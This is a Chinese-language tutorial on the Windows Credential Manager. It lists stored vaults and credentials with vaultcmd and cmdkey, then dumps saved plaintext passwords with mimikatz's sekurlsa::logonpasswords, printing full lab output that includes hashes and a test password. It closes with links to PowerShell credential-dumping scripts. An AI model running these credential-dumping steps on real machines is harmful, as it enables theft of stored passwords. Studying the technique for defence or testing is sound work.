<span style="font-size: 40px; font-weight: bold;">Credential Manager</span>

<div style="text-align: right;">

date: "2024-01-05"

</div>

# Credential Manager 简介

Credential Manager（凭据管理器），用来存储凭据（例如网站登录和主机远程连接的用户名密码），如果用户选择存储凭据，那么当用户再次使用对应的操作，系统会自动填入凭据，实现自动登录，其中没有存储本地登录的账号密码

## 凭据类别

参考文章：[凭据种类](https://learn.microsoft.com/en-us/windows/win32/secauthn/kinds-of-credentials)

分为 Domain Credentials（域凭据）和 Generic Credentials（通用凭据）

### Domain Credentials-域凭据

1. 域凭据由操作系统使用并由本地安全机构 (LSA) 进行身份验证。
2. 当注册的安全包（例如 Kerberos 协议）对用户提供的登录数据进行身份验证时，就会为用户建立域凭据。登录凭据由操作系统缓存，因此单次登录即可让用户访问许多不同的资源。例如，网络连接可以透明地进行，并且可以根据用户缓存的域凭据授予对受保护系统对象的访问权限。
3. 凭据管理功能为应用程序提供了一种机制，可在用户登录后提示用户输入域凭据，并让操作系统对用户提供的信息进行身份验证。
4. 域凭据的秘密部分（密码）受操作系统保护。只有与 LSA 一起运行的代码才能读取和写入域凭据。应用程序仅限于写入域凭据。

### Generic Credentials-通用凭据

1. 通用凭据由直接管理授权和安全性的应用程序定义和验证，而不是将这些任务委托给操作系统。例如，应用程序可以要求用户输入应用程序提供的用户名和密码，或者生成访问网站的证书。
2. 应用程序使用凭据管理功能提示用户输入应用程序定义的通用凭据信息，例如用户名、证书、智能卡或密码。用户输入的信息返回给应用程序进行身份验证。
3. 凭证管理为通用凭证提供可定制的缓存管理和长期存储。用户进程可以读取和写入通用凭据。

# 实操

## vaultcmd 获取凭据基础信息

> 不同类型的凭据保存在不同的保管库(vault)下

### 列出保管库(vault)列表

```shell
C:\Users\c>vaultcmd /list
当前加载的保管库:
        保管库: Web 凭据
        保管库 GUID: 4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        位置: C:\Users\c\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        保管库: Windows 凭据
        保管库 GUID: 77BC582B-F0A6-4E15-4E80-61736B6F3B29
        位置: C:\Users\c\AppData\Local\Microsoft\Vault
```

### 列出保管库(vault)概要，凭据名称和 GUID

> GUID 对应路径 `%localappdata%/Microsoft\Vault\{GUID}` 下的文件

```shell
C:\Users\c>vaultcmd /listschema
全局架构

凭据架构: Windows Secure Note
架构 GUID: 2F1A6504-0641-44CF-8BB5-3612D865F2E5

凭据架构: Windows Web Password Credential
架构 GUID: 3CCD5499-87A8-4B10-A215-608888DD3B55

凭据架构: Windows Credential Picker Protector
架构 GUID: 154E23D0-C644-4E6F-8CE6-5069272F999F

当前加载的凭据架构:

保管库: Web 凭据
保管库 GUID: 4BF4C442-9B8A-41A0-B380-DD4A704DDB28

保管库: Windows 凭据
保管库 GUID: 77BC582B-F0A6-4E15-4E80-61736B6F3B29

凭据架构: Windows 域证书凭据
架构 GUID: E69D7838-91B5-4FC9-89D5-230D4D4CC2BC

凭据架构: Windows 域密码凭据
架构 GUID: 3E0E35BE-1B77-43E7-B873-AED901B6275B

凭据架构: Windows 扩展凭据
架构 GUID: 3C886FF3-2669-4AA2-A8FB-3F6759A77548
```

### 列出保管库(vault)下的所有凭据信息

> 将 GUID 换成需要查询对应的 GUID 即可

列出 GUID 为{77BC582B-F0A6-4E15-4E80-61736B6F3B29}的保管库(vault)下的所有凭据：

```shell
C:\Users\c>vaultcmd /listcreds:{77BC582B-F0A6-4E15-4E80-61736B6F3B29}
保管库中的凭据: {77BC582B-F0A6-4E15-4E80-61736B6F3B29}

凭据架构: Windows 域密码凭据
资源: Domain:target=192.168.136.1
标识: admin
隐藏: 否
漫游: 否
属性(架构元素 ID,值): (100,3)
```

列出 GUID 为{77BC582B-F0A6-4E15-4E80-61736B6F3B29}的保管库(vault)的属性，包括文件位置、包含的凭据数量、保护方法

```shell
C:\Users\c>vaultcmd /listproperties:{77BC582B-F0A6-4E15-4E80-61736B6F3B29}
保管库属性: {77BC582B-F0A6-4E15-4E80-61736B6F3B29}
位置: C:\Users\c\AppData\Local\Microsoft\Vault
凭据数量: 1
当前保护方法: DPAPI
```

## cmdkey 列出凭据

```shell
C:\Users\c>cmdkey /list

当前保存的凭据:

    目标: WindowsLive:target=virtualapp/didlogical
    类型: 普通
    用户: 02lbbjnqmrjxndkj
    本地机器持续时间

    目标: Domain:target=192.168.136.1
    类型: 域密码
    用户: admin
```

## mimikatz 获取凭据明文密码

> mimikatz不仅能导出 `Domain Credentials` 的明文口令，也能导出 `Generic Credentials` 类型的明文口令，但无法导出IE浏览器保存的 `Generic Credentials` 类型的明文口令

```shell
C:\Users\c\Desktop\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 30317633 (00000000:01ce9c41)
Session           : Interactive from 4
User Name         : c
Domain            : DESKTOP-2JRVAGS
Logon Server      : DESKTOP-2JRVAGS
Logon Time        : 2024/1/4 15:50:13
SID               : S-1-5-21-3456007441-3413530527-1386716018-1001
        msv :
         [00000003] Primary
         * Username : c
         * Domain   : DESKTOP-2JRVAGS
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        tspkg :
        wdigest :
         * Username : c
         * Domain   : DESKTOP-2JRVAGS
         * Password : (null)
        kerberos :
         * Username : c
         * Domain   : DESKTOP-2JRVAGS
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : admin
         * Domain   : 192.168.136.1
         * Password : adminpass
        cloudap :

Authentication Id : 0 ; 30317601 (00000000:01ce9c21)
Session           : Interactive from 4
User Name         : c
Domain            : DESKTOP-2JRVAGS
Logon Server      : DESKTOP-2JRVAGS
Logon Time        : 2024/1/4 15:50:13
SID               : S-1-5-21-3456007441-3413530527-1386716018-1001
        msv :
         [00000003] Primary
         * Username : c
         * Domain   : DESKTOP-2JRVAGS
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        tspkg :
        wdigest :
         * Username : c
         * Domain   : DESKTOP-2JRVAGS
         * Password : (null)
        kerberos :
         * Username : c
         * Domain   : DESKTOP-2JRVAGS
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : admin
         * Domain   : 192.168.136.1
         * Password : adminpass
        cloudap :

Authentication Id : 0 ; 30296613 (00000000:01ce4a25)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2024/1/4 15:50:12
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-2JRVAGS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 30296534 (00000000:01ce49d6)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2024/1/4 15:50:12
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-2JRVAGS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 30294286 (00000000:01ce410e)
Session           : Interactive from 4
User Name         : UMFD-4
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2024/1/4 15:50:12
SID               : S-1-5-96-0-4
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-2JRVAGS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 21021896 (00000000:0140c4c8)
Session           : Interactive from 3
User Name         : c
Domain            : DESKTOP-2JRVAGS
Logon Server      : DESKTOP-2JRVAGS
Logon Time        : 2024/1/3 18:11:52
SID               : S-1-5-21-3456007441-3413530527-1386716018-1001
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
         [00000000]
         * Username : admin
         * Domain   : 192.168.136.1
         * Password : adminpass
        cloudap :

Authentication Id : 0 ; 21021864 (00000000:0140c4a8)
Session           : Interactive from 3
User Name         : c
Domain            : DESKTOP-2JRVAGS
Logon Server      : DESKTOP-2JRVAGS
Logon Time        : 2024/1/3 18:11:52
SID               : S-1-5-21-3456007441-3413530527-1386716018-1001
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
         [00000000]
         * Username : admin
         * Domain   : 192.168.136.1
         * Password : adminpass
        cloudap :

Authentication Id : 0 ; 20522372 (00000000:01392584)
Session           : Interactive from 2
User Name         : c
Domain            : DESKTOP-2JRVAGS
Logon Server      : DESKTOP-2JRVAGS
Logon Time        : 2024/1/3 18:09:49
SID               : S-1-5-21-3456007441-3413530527-1386716018-1001
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
         [00000000]
         * Username : admin
         * Domain   : 192.168.136.1
         * Password : adminpass
        cloudap :

Authentication Id : 0 ; 20522343 (00000000:01392567)
Session           : Interactive from 2
User Name         : c
Domain            : DESKTOP-2JRVAGS
Logon Server      : DESKTOP-2JRVAGS
Logon Time        : 2024/1/3 18:09:49
SID               : S-1-5-21-3456007441-3413530527-1386716018-1001
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
         [00000000]
         * Username : admin
         * Domain   : 192.168.136.1
         * Password : adminpass
        cloudap :

Authentication Id : 0 ; 202104 (00000000:00031578)
Session           : Interactive from 1
User Name         : c
Domain            : DESKTOP-2JRVAGS
Logon Server      : DESKTOP-2JRVAGS
Logon Time        : 2023/10/7 18:55:58
SID               : S-1-5-21-3456007441-3413530527-1386716018-1001
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
         [00000000]
         * Username : admin
         * Domain   : 192.168.136.1
         * Password : adminpass
        cloudap :

Authentication Id : 0 ; 201817 (00000000:00031459)
Session           : Interactive from 1
User Name         : c
Domain            : DESKTOP-2JRVAGS
Logon Server      : DESKTOP-2JRVAGS
Logon Time        : 2023/10/7 18:55:58
SID               : S-1-5-21-3456007441-3413530527-1386716018-1001
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
         [00000000]
         * Username : admin
         * Domain   : 192.168.136.1
         * Password : adminpass
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/10/7 18:55:57
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DESKTOP-2JRVAGS$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2023/10/7 18:55:56
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-2JRVAGS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : desktop-2jrvags$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 50880 (00000000:0000c6c0)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/10/7 18:55:56
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-2JRVAGS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 49912 (00000000:0000c2f8)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/10/7 18:55:56
SID               :
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DESKTOP-2JRVAGS$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2023/10/7 18:55:56
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-2JRVAGS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : desktop-2jrvags$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
        cloudap :
```

可以很明显看到上面抓到了事先设置的凭据

```shell
        credman :
         [00000000]
         * Username : admin
         * Domain   : 192.168.136.1
         * Password : adminpass
```

## 获得Generic Credentials的明文口令

工具：
1. [获取IE浏览器保存的Generic Credentials](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-VaultCredential.ps1)
2. [获取其它类型的普通票据](https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1)